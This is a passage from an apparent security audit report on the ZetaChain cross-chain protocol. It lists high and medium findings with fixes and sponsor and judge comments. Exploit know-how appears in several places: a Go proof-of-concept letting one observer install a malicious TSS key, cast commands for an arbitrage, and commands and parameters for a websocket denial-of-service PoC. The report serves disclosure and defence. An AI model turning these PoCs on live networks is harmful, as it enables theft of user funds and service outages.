	fmt.Println("With the InTrackerTx being possible via a proof, this allows arbitrary users to do this as well.")

	// Get all cross chain TXs
	cctxs := k.GetAllCrossChainTx(ctx)
	_ = cctxs

	cctx1 := cctxs[0]
	cctx2 := cctxs[1]

	// Ensure that the status's have completed.
	assert.Equal(t, cctx1.CctxStatus.Status, types.CctxStatus_OutboundMined)
	assert.Equal(t, cctx1.CctxStatus.Status, cctx2.CctxStatus.Status)

	fmt.Println("Msg Digest Difference: ", msg.Digest(), msg2.Digest())
	assert.NotEqual(t, msg.Digest(), msg2.Digest())

	// Checking that the two hashes are the same
	assert.Equal(t, cctx1.InboundTxParams.InboundTxObservedHash, cctx2.InboundTxParams.InboundTxObservedHash)
}
```

</details>

2.  Run the command `go test -v ./x/crosschain/keeper/ -run TestNoDoubleEventProtections`.

3.  Notice that even though a single value of the incoming TX has changed, the vote for the TX passes.

### Short Term Remediation

The obvious solution would be to remove fields that can change over time from the message. This way, small changes do not change the voting index and compromise the duplicate event submission check. However, this does NOT work because it would allow the *finalizing* vote to set many of the fields, which would be bad.

So, it is recommended to have a separate structure for keeping track of events that have already occurred besides the voting process that is specific `index` for an event. For instance, the tx hash, event id and chain id are a great way to verify that an event occurred already to guarantee that the same event is not trying to be added again.

### Long Term Remediation

Defense in depth measures can be put in place to secure this more.

An obvious one is having a *timeout*. For instance, maximum blocks between events or a week of actual time. This would *limit* the scope of the exploit to only recent changes.

Another one would be introducing a *version* scheme for each change the message. On the event voting side, only allowing for specific versions past a specific point would ensure that old ballots could not be resubmitted.

Rigorous testing to ensure that *old* transactions are the same compared to new ones. If a library is upgraded, a byte is dropped or anything else, then a *different* index will be created, resulting in lost funds.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/327#issuecomment-1876960858)**

***

## [[H-13] User funds can be lost in favor of Zeta protocol during a CCTX due to contracts being paused](https://github.com/code-423n4/2023-11-zetachain-findings/issues/191)
*Submitted by [dontonka](https://github.com/code-423n4/2023-11-zetachain-findings/issues/191), also found by [lsaudit](https://github.com/code-423n4/2023-11-zetachain-findings/issues/434)*

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L85> 

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/evm/ZetaConnector.non-eth.sol#L95>

`Observer` take care of inbound/outbound CCTX in Zeta ecosystem. For EVM chains, it works with 3 smart contracts which are deployed on the external EVM chain:

*   `ZetaConnectorEth.sol`:    entry point --> client calls `send` --> ZetaSent log
*   `ZetaConnectorNonEth.sol`: entry point --> client calls `send` --> ZetaSent log
*   `ERC20Custody.sol`:        entry point --> client calls `deposit` --> Deposited log

In case of emergency, these contracts can be paused by calling their corresponding `pause()` function. The assumption would be that they are paused on both the inbound and outbound EVM chains, as otherwise there will be always inbounds CCTX coming in, and that will result more complex to manage. Since the 3 functions mention above are gated by `whenNotPaused`, whenever a contract is paused, it will prevent any inbounds cctx from coming in.

There is a **key problem** in the moment with this scenario: `onRevert` is gated with `whenNotPaused` while `onReceive` is not. This means whenever the contracts are paused (on both chains), the pending CCTX still need to be processed before any migration can happen (eg: migrating TSS). This is the specific reason why `onReceive` is not being gated with `whenNotPaused`, but since `onRevert` is gated, a revert in `onReceive` would kick-off the refund mecanism, which will call `onRevert` on the originating chain but that will always revert if the contract is also paused.

### Impact

User funds can be lost in favor of Zeta protocol during a CCTX due to contracts being paused.

### Proof of Concept

Let's consider the CCTX flow described in the `whitepaper` as follow for `Cross-Chain Message Passing`.

Let's consider a `pending` CCTX between `BSC` and `ETH` chains in a context of an emergency situation where contracts on both BSC and ETH are paused, but our CCTX had already generated his `ZetaSent` event, awaiting to be processed/voted/finalized by the Observers, so it's pending, and now still need to be fully processed while the contracts are paused.

*   At `step 5`, this is where the `onReceive` is being called against ZetaConnector&ast;.sol. But user has a bad luck and unfortunatelly, that revert (eg: caused by `onZetaMessage`).
*   At `step 9`, the `refund mechanism` will be triggered.
*   At `step 11`, this is when `onRevert` will be called. Since the BSC ZetaConnector&ast;.sol is also paused, this will revert right away (caused by `whenNotPaused`), and at `step 14` failure will be confirmed, hence funds will not be refunded to the user in the end and remain in Zeta protocol, which is effectivaly `user funds lost`.

### Cross-Chain Message Passing flow

1.  An end user interacts with a Contract C1 on Chain A.
2.  The interaction leaves an event or transaction memo, with user specified \[chainID,

contractAddress, message]. (the message is arbitrarily encoded application
data in binary format.
3\. ZetaChain observers (in zetaclient) pick up this event/memo and report to
zetacore, which verifies the inbound transaction.
4\. zetacore modifies the CCTX (cross-chain tx) state variable with OutboundTxParams
which instructs the TSS signers (in zetaclient) to build, sign, and broadcast
external transaction.
5\. The zetaclient TSS signers observe the OutboundTxParams in the CCTX, and
build outbound tx, enter into a TSS keysign ceremony to sign the transaction,
and then broadcast the signed transaction to the external blockchains. For
CCMP, the outbound transaction is mainly calling the user specified contract
with specified addresses and parameters.
6\. The CCTX structure also tracks the stages/status of the cross-chain transaction.
7\. Once the broadcasted transaction is included in one of the blocks (said to be
“mined” or “confirmed”), zetaclients will report such confirmation to zetacore,
which will update the CCTX status.
8\. If the “confirmed” outbound transaction was successful, the CCTX status becomes OutboundMined, and the CCTX is considered in its terminal state and
will not be updated anymore. This CCTX processing is completed.
9\. If the “confirmed” outbound transaction is failure (e.g. revert on Ethereum
chains), then the CCTX will updates it status to PendingRevert if possible, or
Aborted if revert is not possible. The CCTX processing is completed if it
goes to Aborted status.
10\. If the new status is “PendingRevert”, a second OutboundTxParams should be
already in the CCTX, which instructs the zetaclients to create a “Revert” outbound tx to the incoming chain & contract, allowing the incoming contract to
implement a application level revert function to cleanup contract state.
11\. The zetaclients will build the revert transaction, enter into TSS keysign ceremony to sign the transaction, and broadcast to the incoming blockchain (Chain
A in this case).
12\. Once the revert transaction is “confirmed” on Chain A, the zetaclients will
report the transaction status to zetacore.
13\. If the revert transaction is successful, the CCTX status becomes Reverted, and
the CCTX processing is completed.
14\. If the revert transaction is failure, the CCTX status becomes Aborted, and the
CCTX processing is completed.

### Recommended Mitigation Steps

Whenever contracts are paused in case of emergency, in order to properly complete the `pending CCTXs`, the entire CCTX flow must be active, which include the refund mechanism.

By removing the `whenNotPaused` on `onRevert` function, that will resolve the problem, so I would recommend the following change in `ZetaConnectorEth.sol` and `ZetaConnectorNonEth.sol`

```diff
    function onRevert(
        address zetaTxSenderAddress,
        uint256 sourceChainId,
        bytes calldata destinationAddress,
        uint256 destinationChainId,
        uint256 remainingZetaValue,
        bytes calldata message,
        bytes32 internalSendHash
-    ) external override whenNotPaused onlyTssAddress {
+    ) external override onlyTssAddress {
```

**[lumtis (ZetaChain) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/191#issuecomment-1895195482):**
 > This is a valid issue.

**[0xean (Judge) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/191#issuecomment-1898491034):**
 > Since the pause state is meant to be utilized in the course of normal operations (updating the TSS address for example), I think H is actually warranted.

_Note: See full discussion [here](https://github.com/code-423n4/2023-11-zetachain-findings/issues/191)._

***

## [[H-14] TSS Key Voting Hash Collision](https://github.com/code-423n4/2023-11-zetachain-findings/issues/133)
*Submitted by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/133), also found by ciphermarco ([1](https://github.com/code-423n4/2023-11-zetachain-findings/issues/552), [2](https://github.com/code-423n4/2023-11-zetachain-findings/issues/545))*

The *Observer* role is somewhat sensitive but a single observer should not be able to influence a single action to happen. There are multiple observers with parts of the TSS key that vote on events occurring on other chains. From the documentation, *"Its important to ensure that at no time is any single entity or small fraction of nodes able to sign messages on behalf of ZetaChain on external chains"*.

When an observer is added, an observer is removed or the admin simply asks, the TSS key is regenerated. The full flow of this is explained below:

1.  Start keygen is triggered.
2.  Zetaclient does the key generation process with the other observers.
3.  Observers vote on the new public key via the `CreateTSSVoter` message to Zetachain.
4.  The vote passes once 100% of Observers have voted. This updates the TSS address on Zetachain, which is then used by the Zetaclient and many other things.
5.  `MigrateTSSFunds` message is sent to transfer funds from the old address to the new one for each chain, which is only callable by an admin group.
6.  TSS address is updated on all chains manually for the ERC20Custody contract and Connectors by the admin.
7.  Admin turns on inbound transactions.
8.  Everything should be functional again.

Since the TSS (threshold signature) contains all of the funds for the various blockchains (BTC, ETH, etc.) and has complete power to perform actions on the `Connector` contract, this process must be done securely.

The voting process for this has a catastrophic flaw: the hash used for the voting index does NOT include the public key being voted on. Since this hash is what determines if two votes are the same, the final observer can submit a public key that will be used as the voted on key. The TSS voting requires 100% of voters to agree, making it trivial to time this as the last voter.

If an attacker exploits this, the `MigrateTSSFunds` message will send all of the TSS value (BTC, ETH, etc.) to an attacker controlled address. Additionally, the TSS address will be used for parsing events and for access control on the connector contract, allowing for complete compromise of these as well transactions as well. So, practically all funds are possible to steal and funds can be created out of thin air.

### Proof of Concept

The proof of concept below was added into the `msg_tss_voter_test.go` file under the `x/crosschain/keeper/` path. This creates 4 observers and the final observer submits the malicious public key. Since the vote passes and the TSS address is replaced, this will be used by the zetaclient for future operations and by the admin on the `MigrateTSSFunds` call.

To run, use the command `go test -v ./x/crosschain/keeper/ -run TestTssHashCollision`.

<details>

```go
package keeper_test

import (
	"fmt"
	"testing"

	"github.com/zeta-chain/zetacore/common"
	keepertest "github.com/zeta-chain/zetacore/testutil/keeper"
	"github.com/zeta-chain/zetacore/x/crosschain/keeper"
	"github.com/zeta-chain/zetacore/x/crosschain/types"
	observerTypes "github.com/zeta-chain/zetacore/x/observer/types"
	observertypes "github.com/zeta-chain/zetacore/x/observer/types"
)

func TestTssHashCollision(t *testing.T) {

	// List of observers to use for voting
	observer1Address := "zeta1w5czgpk5kc9etxw2anzhr0uyrr4fqks32qmk6k"
	observer2Address := "zeta1w8qa37h22h884vxedmprvwtd3z2nwakxu9k935"
	observer3Address := "zeta1hk05v9len8u0c2xrwxgfknvcskpd4vncm7ehch"
	observer4Address := "zeta1g323lusfa9qqvjvupajre2dphuem999fahc086"

	observers := []string{observer1Address, observer2Address, observer3Address, observer4Address}

	k, ctx, _, zk := keepertest.CrosschainKeeper(t)

	msgServer := keeper.NewMsgServerImpl(*k)

	/*
		Setup various things for testing
	*/
	// Set the chain ids we want to use to be valid
	params := observertypes.DefaultParams()
	zk.ObserverKeeper.SetParams(
		ctx, params,
	)

	// Add validator to the observer list for voting
	// Normally happens within MsgAddObserver
	chains := zk.ObserverKeeper.GetParams(ctx).GetSupportedChains()
	for _, chain := range chains {
		zk.ObserverKeeper.SetObserverMapper(ctx, &observertypes.ObserverMapper{
			ObserverChain: chain,
			ObserverList:  []string{observer1Address, observer2Address, observer3Address, observer4Address},
		})
	}
	// Add to privileged node list. Normally happens within MsgAddObserver
	for _, address := range observers {
		pubkeySet := common.PubKeySet{Secp256k1: "", Ed25519: ""}
		zk.ObserverKeeper.SetNodeAccount(ctx, observerTypes.NodeAccount{
			Operator:       address, // Make the same as the things above later..
			GranteeAddress: address,
			GranteePubkey:  &pubkeySet,                      // DK
			NodeStatus:     observerTypes.NodeStatus_Active, // DK
		})
	}

	// Turn on the keygen process for a moment
	item := observerTypes.Keygen{
		BlockNumber: 10,
	}
	zk.ObserverKeeper.SetKeygen(ctx, item)

	// List of messages to use
	msg := &types.MsgCreateTSSVoter{
		Creator:          observer1Address,
		TssPubkey:        "Key1", // Key1
		KeyGenZetaHeight: 3,
		Status:           common.ReceiveStatus_Success,
	}
	msg2 := &types.MsgCreateTSSVoter{
		Creator:          observer2Address,
		TssPubkey:        "Key1", // Key2 - different than key1!
		KeyGenZetaHeight: 3,
		Status:           common.ReceiveStatus_Success,
	}
	msg3 := &types.MsgCreateTSSVoter{
		Creator:          observer3Address,
		TssPubkey:        "Key1", // Key2 - different than key1!
		KeyGenZetaHeight: 3,
		Status:           common.ReceiveStatus_Success,
	}
	msg4 := &types.MsgCreateTSSVoter{
		Creator:          observer4Address,
		TssPubkey:        "MaliciousKeyThatOnlyIVotedOn", // Key2 - different than key1!
		KeyGenZetaHeight: 3,
		Status:           common.ReceiveStatus_Success,
	}

	if msg.Digest() == msg4.Digest() {
		fmt.Println("=======================")
		fmt.Println("Voting hash collision!")
		fmt.Println("=======================")
	}
	fmt.Println("Msg.digest() on msg1 and msg4- ", msg.Digest(), msg4.Digest())
	fmt.Println("Msg1: ", msg)
	fmt.Println("Msg4: ", msg4)

	// Currently failing
	res, err := msgServer.CreateTSSVoter(
		ctx,
		msg,
	)
	res2, err2 := msgServer.CreateTSSVoter(
		ctx,
		msg2,
	)
	res3, err3 := msgServer.CreateTSSVoter(
		ctx,
		msg3,
	)

	res4, err4 := msgServer.CreateTSSVoter(
		ctx,
		msg4,
	)

	fmt.Println(res, err)
	fmt.Println(res2, err2)
	fmt.Println(res3, err3)
	fmt.Println(res4, err4)

	// Show that the vote for the given digest passed
	ballot, _ := zk.ObserverKeeper.GetBallot(ctx, msg.Digest())
	fmt.Println("Ballot: ", ballot)

	// KeyGen information. Passed with our information
	fmt.Println(zk.ObserverKeeper.GetKeygen(ctx))

	fmt.Println("Showing off the malicious key")
	fmt.Println("============================")
	tss, _ := k.GetTSS(ctx)
	fmt.Println(tss)
	fmt.Println("PublicKey: ", tss.TssPubkey)
}
```
</details>

Output of the test being ran:

    === RUN   TestTssHashCollision
    =======================
    Voting hash collision!
    =======================
    Msg.digest() on msg1 and msg4-  3-tss-keygen 3-tss-keygen
    Msg1:  creator:"zeta1w5czgpk5kc9etxw2anzhr0uyrr4fqks32qmk6k" tss_pubkey:"Key1" keyGenZetaHeight:3 status:Success 
    Msg4:  creator:"zeta1g323lusfa9qqvjvupajre2dphuem999fahc086" tss_pubkey:"MaliciousKeyThatOnlyIVotedOn" keyGenZetaHeight:3 status:Success 
     <nil>
     <nil>
     <nil>
     <nil>
    Ballot:  {3-tss-keygen 3-tss-keygen [zeta1g323lusfa9qqvjvupajre2dphuem999fahc086 zeta1hk05v9len8u0c2xrwxgfknvcskpd4vncm7ehch zeta1w5czgpk5kc9etxw2anzhr0uyrr4fqks32qmk6k zeta1w8qa37h22h884vxedmprvwtd3z2nwakxu9k935] [SuccessObservation SuccessObservation SuccessObservation SuccessObservation] TSSKeyGen 1.000000000000000000 BallotFinalized_SuccessObservation 1}
    {KeyGenSuccess [] 1} true
    Showing off the malicious key
    ============================
    {MaliciousKeyThatOnlyIVotedOn [] [zeta1g323lusfa9qqvjvupajre2dphuem999fahc086 zeta1hk05v9len8u0c2xrwxgfknvcskpd4vncm7ehch zeta1w5czgpk5kc9etxw2anzhr0uyrr4fqks32qmk6k zeta1w8qa37h22h884vxedmprvwtd3z2nwakxu9k935] 1 3}
    PublicKey:  MaliciousKeyThatOnlyIVotedOn
    --- PASS: TestTssHashCollision (0.01s)
    PASS

### Recommended Mitigation Steps

*   Use the `publicKey` being submitted as part of the hash. In fact, just including all parts of the message (besides the creator and yes/no vote) should be added in to ensure the security of the platform.
*   Many of the other locations simply take a hash of the message minus a few fields, such as [here](https://github.com/code-423n4/2023-11-zetachain/blob/2834e3f85b2c7774e97413936018a0814c57d860/repos/node/x/observer/types/message_add_blame_vote.go#L54)

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/133#issuecomment-1877493723)**

***
 
# Medium Risk Findings (34)
## [[M-01] Gas Coin Setup Result In Immediate Profitable Arbitrage](https://github.com/code-423n4/2023-11-zetachain-findings/issues/580)
*Submitted by [MevSec](https://github.com/code-423n4/2023-11-zetachain-findings/issues/580)*

A gas coin can be added by running the `DeployFungibleCoinZRC20` message. This is most notably done when adding a new blockchain support, because each of them has their respective supported “gas ZRC20” which is the native token of this newly supported blockchain as a ZRC compliant token on Zetachain. These liquidity pools are required because we need to be able to get those “gas ZRC20” at some point in order to burn them to redeem them for an equivalent amount of native tokens.

If this new blockchain that is supported is Polygon, then we will deploy a liquidity pool with 0.1 WZETA and 0.1 zrc20-MATIC on deployment so validators can swap these ZETA tokens for the Polygon’s native token.

From the code:

```go
// If this is a gas coin, the following happens:
//
// * ZRC20 contract for the coin is deployed
// * contract address of ZRC20 is set as a token address in the system
// contract
// * ZETA tokens are minted and deposited into the module account
// * setGasZetaPool is called on the system contract to add the information
// about the pool to the system contract
// * addLiquidityETH is called to add liquidity to the pool
```

Which calls the `SetupChainGasCoinAndPool` function.

This is not an issue for low value tokens, but is for tokens such as BTC, ETH, and SOL.
If we take the example of BTC, with 0.1 BTC having a value of \~4400$ being added with a ZETA token which is going to make the pool imbalanced with a significant value at stake.

An arbitrage opportunity will be created as a first come first serve rule, which is going to be a net loss for the protocol because these “gas ZRC20” can be directly redeemed for native tokens on the blockchain by users by withdrawing the assets later.

Someone could then monitor for new blockchains supported by Zetachain and if the token valuation is extremely disparate compared to the ZETA token, they could backrun the liquidity add by swapping some ZETA tokens and make an instant profit.

In this command, we ask for the `token0` name of the pair 0 which is the ETH ZRC20 gas token:

```
$ cast call $(cast call $(cast call 0x9fd96203f7b22bCF72d9DCb40ff98302376cE09c "allPairs(uint256)(address)" 0) "token0()(address)") "name()(string)"
"ETH-goerli_localnet"
```

And we can also verify that the balance of each assets in the reserves is 0.1:

```
$ cast call $(cast call 0x9fd96203f7b22bCF72d9DCb40ff98302376cE09c "allPairs(uint256)(address)" 0) "getReserves()(uint112,uint112,uint32)"
100000000000000000 [1e17]
100000000000000000 [1e17]
1702765357 [1.702e9]
```

Next, let’s check for BTC:

```
$ cast call $(cast call $(cast call 0x9fd96203f7b22bCF72d9DCb40ff98302376cE09c "allPairs(uint256)(address)" 1) "token1()(address)") "name()(string)"
"BTC-btc_regtest"
```

Make sure that 0.1 BTC is in the reserves:

```
$ cast call $(cast call 0x9fd96203f7b22bCF72d9DCb40ff98302376cE09c "allPairs(uint256)(address)" 1) "getReserves()(uint112,uint112,uint32)"
100000000000000000 [1e17]
10000000 [1e7]
1702765357 [1.702e9]
```

### Recommended Mitigation Steps

Before adding a new blockchain and a gas token, you could either add much less initial liquidity such as a mantissa of -3 to make the BTC amount much less profitable, or make the initial liquidity configurable from the message passing.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/580#issuecomment-1883597859)**

**[0xean (Judge) decreased severity to Medium](https://github.com/code-423n4/2023-11-zetachain-findings/issues/580#issuecomment-1883975598)**

***

## [[M-02] JSON-RPC DoS through Websockets](https://github.com/code-423n4/2023-11-zetachain-findings/issues/566)
*Submitted by [MevSec](https://github.com/code-423n4/2023-11-zetachain-findings/issues/566)*

The Websocket service accepts messages for 32MB size.

*File: [repos\node\rpc\websockets.go](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/rpc/websockets.go#L50C1-L50C1)*

```go
const (
	messageSizeLimit = 32 * 1024 * 1024 // 32MB

)
(...)
conn.SetReadLimit(messageSizeLimit)
```

This size is 3 times bigger than what Golang accepts by default (10MB) on the HTTP service, while there is no reason that websocket payloads are bigger than HTTP payloads. In addition, there is no rate limiting within the code for the websockets.

As a consequence, an external attacker can **take down** the JSON RPC server by :

*   Opening a websocket RPC Connection to Zetachain through Websockets.
*   Sending in loop, with parallel workers, malicious Websockets messages (with an unknown method) and a total message size of 32MB.

### Details

When the WebSocket server runs, it listens to the messages with `readLoop()` (L211).

When a message is received, the message body is put in `mb` variable. (L222)

This content will then be used to instance a **msg** variable.

*File: [repos\node\rpc\websockets.go](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/rpc/websockets.go#L222)*

```go
_, mb, err := wsConn.ReadMessage()
(...)
var msg map[string]interface{}
		if err = json.Unmarshal(mb, &msg); err != nil {
			s.sendErrResponse(wsConn, err.Error())
			continue
		}
```

Afterwards, some other variables are defined:

*   **method** - msg\["method"]
*   **id** - msg\["id"]

Depending on the "method", a switch case will determine the execution path.
If the method is unknown, a call is done to `tcpGetAndSendResponse()`:

*File: [repos\node\rpc\websockets.go](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/rpc/websockets.go#L319)*

```go
		default:
			// otherwise, call the usual rpc server to respond
			if err := s.tcpGetAndSendResponse(wsConn, mb); err != nil {
				s.sendErrResponse(wsConn, err.Error())
			}
		}

```

This `tcpGetAndSendResponse` function will call the RPC, locally with HTTP:

*File: [repos\node\rpc\websockets.go](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/rpc/websockets.go#L344)*

```go
func (s *websocketsServer) tcpGetAndSendResponse(wsConn *wsConn, mb []byte) error {
	req, err := http.NewRequestWithContext(context.Background(), "POST", "http://"+s.rpcAddr, bytes.NewBuffer(mb))
	if err != nil {
		return errors.Wrap(err, "Could not build request")
	}
```

However, this function does not perform any sanitation check.
If an attacker sends a 32Mb message on Websockets, **it will internally forward the call to the HTTP server with 32Mb payload**.

### Proof of Concept

A PoC was developed to exploit the vulnerability with :

*   14MB incorrect method name eth_XYZ where XYZ is a random 14MB string,

    The interest in using this function is that the server will attempt to send back the name of the method that was not found, sending therefore an extra 14MB back to the client.

*   14MB payload (random string)

*   Only non-ASCII characters in the payload since it seems to cause more problems on the server upon decoding.

*   30 workers from a single machine

The PoC can be found here : <https://gist.github.com/0xfadam/2846ee14d67ea95741f27e50570ac77a>

The PoC can be launch with the following commands:

```
go mod init poc
go mod tidy
go run poc.go -ip 127.0.0.1 -ws-port 9546 -secure=false -workers 30
```

A video showing the crash of the server after exploitation can be found below :

<https://drive.google.com/open?id=130MD8xBhNPNawRYksuETfP1P0Kr9Zxom&usp=drive_fs>

### Recommended Mitigation Steps

The Zetachain server needs to:

*   Limit the size of each message. It should be the same what is configured for HTTP (10 MB)
*   Enforce an applicative rate-limit mechanism so a single client cannot send thousands of messages within a short timeframe.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/566#issuecomment-1877395525)**

**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/566#issuecomment-1880146631):**
 > Warden fails to show how this leads to a direct loss of funds. DOS is considered Medium severity.

***

## [[M-03] `AddToInTxTracker` doens't allow permissionless tx validation for Bitcoin chain, InTxTracker permissionless tx validation for Bitcoin chain will always fail](https://github.com/code-423n4/2023-11-zetachain-findings/issues/563)
*Submitted by [oakcobalt](https://github.com/code-423n4/2023-11-zetachain-findings/issues/563)*

Permissionless tx validation for EVM and Bitcoin chain should be supported based on audit [doc](https://github.com/code-423n4/2023-11-zetachain/blob/main/docs/important-areas.md)`→ The system is currently implemented for Ethereum/BSC and Bitcoin`. However, currently permissionless tx validation for EVM and Bitcoin chain are only supported in `AddToOutTxTracker`, but not supported in `AddToInTxTracker`. Permissionless validation for InTx for bitcoin chain will always fail.

### Proof of Concept

In `AddToInTxTracker()` from msg_server_add_to_intx_tracker.go, chain is incorrectly diverted. The bitcoin chain is missing and will return an error.

```go
//x/crosschain/keeper/msg_server_add_to_intx_tracker.go
func (k msgServer) AddToInTxTracker(goCtx context.Context, msg *types.MsgAddToInTxTracker) (*types.MsgAddToInTxTrackerResponse, error) {
...
		if common.IsEVMChain(msg.ChainId) {
			err = k.VerifyEVMInTxBody(ctx, msg, txBytes)
			if err != nil {
				return nil, types.ErrTxBodyVerificationFail.Wrapf(err.Error())
			}
} else {
               //@audit when ChainId is bitCoin chain, this will return an error
|>			return nil, types.ErrTxBodyVerificationFail.Wrapf(fmt.Sprintf("cannot verify inTx body for chain %d", msg.ChainId))
		}
```

(<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_add_to_intx_tracker.go#L38-L39>)

Notice in `AddToOutTxTracker()`, bitcoin chain is correctly diverted with `  else if common.IsBitcoinChain(msg.ChainId) `statement.

### Recommended Mitigation Steps

In `AddToInTxTracker()`, add `IsBitcoinChain(msg.ChainId)` to correctly handle when chainId is bitcoin chain.

**[oakcobalt (Warden) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/563#issuecomment-1889490101):**
> (1) According to [doc](https://github.com/code-423n4/2023-11-zetachain/blob/main/docs/important-areas.md),  both `AddToInTxTracker` and `AddToOutTxTracker` are supported for permissionless validation and both should support bitcoin chain and EVM chain. So IMO, the lookout's quote supports the validity of this report. 
> 
> > An inbound/outbound tx can be sent by anyone with a proof. The proof is checked against the header of the chain to validate it
> >→ The system is currently only used to validate txs to be added in the tracker through MsgAddToInTxTracker and MsgAddToOutTxTracker and not to validate txs to be observed as part of the ZetaChain cross-chain tx workflow
> >→ The system is currently implemented for Ethereum/BSC and Bitcoin
> 
> Note that this issue concerns only ` MsgAddToInTxTracker and MsgAddToOutTxTracker`, and doens't concern `validate txs to be observed as part of the ZetaChain cross-chain tx workflow`. The latter is part of keeper -> vote_inbound_tx / vote_outbound_tx flow, which is irrelevant to this discussion. 
> 
> (2)This report argues that `AddToInTxTracker()` is flawed because it currently will revert when the chain is Bitcoin. For reference, `AddToOutTxTracker()` currently correctly supports both Bitcoin chain and EVM chain. This means `AddToInTxTracker()` needs to be fixed to support both chains.
> 
> a) `AddToInTxTracker()` : This reverts when the chain is Bitcoin
> ```solidity
> //x/crosschain/keeper/msg_server_add_to_intx_tracker.go
> func (k msgServer) AddToInTxTracker(goCtx context.Context, msg *types.MsgAddToInTxTracker) (*types.MsgAddToInTxTrackerResponse, error) {
> ...
> 		if common.IsEVMChain(msg.ChainId) {
> 			err = k.VerifyEVMInTxBody(ctx, msg, txBytes)
> ...
> } else {
>                //@audit when ChainId is bitCoin chain, this will return an error
> |>			return nil, types.ErrTxBodyVerificationFail.Wrapf(fmt.Sprintf("cannot verify inTx body for chain %d", msg.ChainId))
> 		}
> ```
> (https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_add_to_intx_tracker.go#L38-L39)
> 
> b) `AddToOutTxTracker()`: This supports both bitcoin and evm chains
> ```solidity
> //x/crosschain/keeper/msg_server_add_to_outtx_tracker.go
> func (k msgServer) AddToOutTxTracker(goCtx context.Context, msg *types.MsgAddToOutTxTracker) (*types.MsgAddToOutTxTrackerResponse, error) {
> ...
> 	chain := k.zetaObserverKeeper.GetParams(ctx).GetChainFromChainID(msg.ChainId)
> ...
> 	if msg.Proof != nil { // verify proof when it is provided
> ...
> |>		err = k.VerifyOutTxBody(ctx, msg, txBytes)
> 		if err != nil {
> 			return nil, types.ErrTxBodyVerificationFail.Wrapf(err.Error())
> 		}
> 		isProven = true
> ...
> }
> 
> func (k Keeper) VerifyOutTxBody(ctx sdk.Context, msg *types.MsgAddToOutTxTracker, txBytes []byte) error {
> ...
> 	// verify message against transaction body
> 	if common.IsEVMChain(msg.ChainId) {
> 		err = VerifyEVMOutTxBody(msg, txBytes, tss.Eth)
>         //@audit-info note: this supports both chains
> |>	} else if common.IsBitcoinChain(msg.ChainId) {
> 		err = VerifyBTCOutTxBody(msg, txBytes, tss.Btc)
> 	} else {
> 		return fmt.Errorf("cannot verify outTx body for chain %d", msg.ChainId)
> 	}
> ...
> }
> ```
> (https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_add_to_outtx_tracker.go#L118)

**[0xean (Judge) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/563#issuecomment-1890754743):**
 > @oakcobalt - Thanks for raising this.  I agree it's not handled correctly for BTC on the input flow AND it does state that it should in the audit docs.  There is of course a work around (using the permissioned flow). That being said since the sponsor call out this new flow as being important, I think it probably warrants M. Lets get @lumtis to provide an opinion here on severity before we finalize it all. 

**[lumtis (ZetaChain) confirmed and commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/563#issuecomment-1891429436):**
 > Yes, Bitcoin should be added here.

**[0xean (Judge) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/563#issuecomment-1896201835):**
 > Thanks all, Medium it is. 

***

## [[M-04] `AddBlockHeader` Cannot Cope with Reorgs](https://github.com/code-423n4/2023-11-zetachain-findings/issues/542)
*Submitted by [ciphermarco](https://github.com/code-423n4/2023-11-zetachain-findings/issues/542)*

`AddBlockHeader` handles adding a block header to the node's store, through majority voting of observers. Reorgs happen, at different rates and depths for different chains and network conditions, but they do happen. And not only defensive measures must be taken to deal with them, but also remediation measures in case they occur more aggressively than expected. The problem is that a critical function to remove or reorganise the blocks is somehow missing from the external interface.

This submission is not about the estimation of financial loss or impact of reorgs, but the clear technical fact that blocks cannot be removed out of the store or somehow reorganised in case of emergency.

### Proof of Concept

The [`AddBlockHeader` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/msg_server_add_block_header.go#L14) is only called by observers after a certain number of confirmations is reached in the clients; [2 for Bitcoin](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/types/core_params_mainnet.go#L44), [14 for Ethereum](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/types/core_params_mainnet.go#L18), and [14 for BSC](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/types/core_params_mainnet.go#L31). As I intend to submit this topic in a Low/QA report, in this submission I will ignore that I find those confirmation numbers dangerously low for a software like ZetaChain.

